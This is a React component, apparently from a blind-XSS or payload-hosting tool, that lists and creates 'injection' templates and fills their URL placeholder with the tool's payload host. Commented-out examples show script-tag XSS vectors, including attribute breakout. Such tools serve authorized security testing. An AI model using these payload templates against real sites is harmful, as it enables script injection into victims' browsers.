import React from 'react';
import axios from 'axios';

import { API_PAYLOADS, URL_PAYLOAD, API_INJECTIONS} from "../helpers/constants";
import { Checkbox, Select, Container, FormLabel, Button, Input, Grid, Dialog, DialogTitle, DialogActions, DialogContent, TextField } from '@material-ui/core';
import EnhancedTable from './Table';
import  "../styles/InjectionsList.css";

const REPLACE_URL_TAG = "##URL##"
const REPLACE_SRI_TAG = "##SRI_HASH##"
const SRIKinds = ["sha256", "sha384", "sha512"]

export default class InjectionsList extends React.Component {
    constructor(props) {
        super(props)
        this.state = {
            headCells: [
                { id: 'ID', field:"id", numeric: false, disablePadding: false, label: 'id', ellipsis: true, hidden:true },
                { id: 'Name', field:"name", numeric: false, disablePadding: false, label: 'Name', ellipsis: true },
                { id: 'Injection', field: "formatedContent", numeric: false, disablePadding: false, label: 'Injection' },
                { id: 'Created_At', field: "created_at", numeric: false, disablePadding: false, label: 'Created At', ellipsis: true },
            ],
            newTitle: "",
            newContent: "",
            currentAlias : "",
            aliasesOrPayloadsIDs: [""],
            useSubdomain: false,
            useHTTPS: true,
            SRIKind: SRIKinds[0],
            injections: [
                // {"title": "basic", "content": `"><script src="##URL##"></script>`},
                // {"title": "No quote", "content": `<script src=##URL##></script>`},
                // {"title": "With SRI", "content": `<script src="##URL##" integrity="##SRI_HASH##"></script>`},
            ],
            openDialog: false,
        }
    };
    setCurrentAlias = (event) => {
        let s = event.target.value
        if (!s){
            s = ""
        }
        this.setState({currentAlias: s});
        this.updateInjections()
    }
    setCurrentSRI = (event) => {
        let s = event.target.value
        let found = SRIKinds.indexOf(s)
        if (found > -1){
            this.setState({ SRIKind: SRIKinds[found] });
            return
        }
        this.setState({ SRIKind: SRIKinds[0] });
        this.updateInjections()
    }
    toggleSubdomain = (event) =>{
        this.setState({ useSubdomain: event.target.checked });
        this.updateInjections()
    }
    toggleHTTPS = (event) =>{
        this.setState({ useHTTPS: event.target.checked });
        this.updateInjections()
    }
    componentDidMount() {
        //TODO: fetch a new endpoint which lists all the injections payload.
        axios.get(API_PAYLOADS)
        .then(res => {
            if (res.status !== 200) {
                throw new Error("Couldn't load payloads")
            } else {
                return res.data
            }
        }).then((rows) => {
            let tmp = [];
            console.log("Payloads: ", rows.data)
            rows.data.map((row) => {
                return tmp.push([
                    row.id,
                    row.name
                ])
            })
            this.setState({
                aliasesOrPayloadsIDs: tmp
            });
        });
        
        axios.get(API_INJECTIONS)
        .then(res => {
            if (res.status !== 200) {
                throw new Error("Couldn't load injections")
            } else {
                return res.data
            }
        }).then((rows) => {
            rows.data.map(injection => {
                injection.formatedContent = this.formatInjection(injection.content)
                return injection
            })
            this.setState({
                injections: rows.data
            });
            this.updateInjections()
        });
    };
    updateInjections = () => {
        let injections = this.state.injections.map(injection => {
            injection.formatedContent = this.formatInjection(injection.content)
            return injection
        })
        console.log(injections)
        this.setState({
            injections: injections
        });
    }
    formatInjection = (injection) => {
        console.log("injection:", injection)
        let url = ""
        let res = ""
        let proto = "http" + (this.state.useHTTPS ? "s" : "") + ":"
        if (this.state.useSubdomain) {
            url = proto + "//" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
        }else {
            url = proto + URL_PAYLOAD + this.state.currentAlias;
        }
        res = injection.replace(REPLACE_URL_TAG, url)
        res = res.replace(REPLACE_SRI_TAG, this.state.SRIKind)
        console.log("res:", res)
        return res
    }
    formatPayloadName = (payloadID, payloadName) => {
        if(payloadID && payloadName){
            return payloadID.slice(0,8) + `... (${payloadName})`
        }
        return ""
    }
    newInjection = (event) => {
        let injections = this.state.injections
        injections.push({ "name": this.state.newTitle, "content": this.state.newContent })
        this.setState({"injections": injections})
        this.updateInjections()
        axios.post(API_INJECTIONS, {
            name: this.state.newTitle,
            content: this.state.newContent
        })
        .then(res => {
            console.log("OK, saved injection", res)
        });
        this.handleClickOpenClose();
    }

    handleClickOpenClose = () => {
        this.setState({
            openDialog: !this.state.openDialog
        });
    }

    render() {
        return (
            <Container>
                <Grid container spacing={3}>
                    <Grid item xs={6}>
                        <FormLabel>
                            Payload ID and/or alias:
                            <Select onChange={this.setCurrentAlias}>
                                {
                                    this.state.aliasesOrPayloadsIDs.map((aop) => {
                                        return (
                                            <option value={aop[0]}>{this.formatPayloadName(aop[0], aop[1])}</option>
                                        )
                                    })
                                }
                            </Select>
                        </FormLabel>
                    </Grid>
                    <Grid item xs={6}>
                        <FormLabel>
                            SRI Type:
                            <Select onChange={this.setCurrentSRI}>
                                {
                                    SRIKinds.map((sri) => {
                                        return (
                                            <option value={sri}>{sri}</option>
                                            )
                                        })
                                    }
                            </Select>
                        </FormLabel>
                    </Grid>
                    <Grid item xs={6}>
                        <FormLabel>
                            Use subdomain:
                            <Checkbox
                                value="useSubdomain"
                                inputProps={{ 'aria-label': 'Use Subdomain' }}
                                onChange={this.toggleSubdomain}
                                color="default"
                                />
                        </FormLabel>
                    </Grid>
                    <Grid item xs={6}>
                        <FormLabel>
                            Use HTTPS:
                            <Checkbox
                                value="useHTTPS"
                                inputProps={{ 'aria-label': 'Use HTTPS' }}
                                onChange={this.toggleHTTPS}
                                color="default"
                                defaultChecked
                                />
                        </FormLabel>
                    </Grid>
                    <Grid item xs={12}>
                        <EnhancedTable headCells={this.state.headCells} data={this.state.injections}  isDeleteButtonEnabled={true}></EnhancedTable>
                    </Grid>
                    <Grid item xs={12}>
                        <Button className="submit-button" variant="outlined" color="primary" onClick={this.handleClickOpenClose}>
                            Create new injection
                        </Button>
                        <Dialog open={this.state.openDialog} onClose={this.handleClickOpenClose} aria-labelledby="form-dialog-title">
                            <DialogTitle id="form-dialog-title">New injection</DialogTitle>
                            <DialogContent>
                                <Grid container spacing={3}>
                                    <Grid item xs={12}>
                                        <Input type="text" placeholder="Name" className="input" onChange={(event) => this.setState({ newTitle: event.target.value })}></Input>
                                    </Grid>
                                    <Grid item xs={12}>
                                        <TextField type="text" placeholder="Injection" className="input" onChange={(event) => this.setState({ newContent: event.target.value })} multiline/>
                                    </Grid>
                                </Grid>
                            </DialogContent>
                            <DialogActions>
                            <Button onClick={this.handleClickOpenClose} color="primary">
                                Cancel
                            </Button>
                            <Button onClick={this.newInjection} color="primary">
                                Create
                            </Button>
                            </DialogActions>
                        </Dialog>
                    </Grid>
                </Grid>
            </Container>
        );
    };
}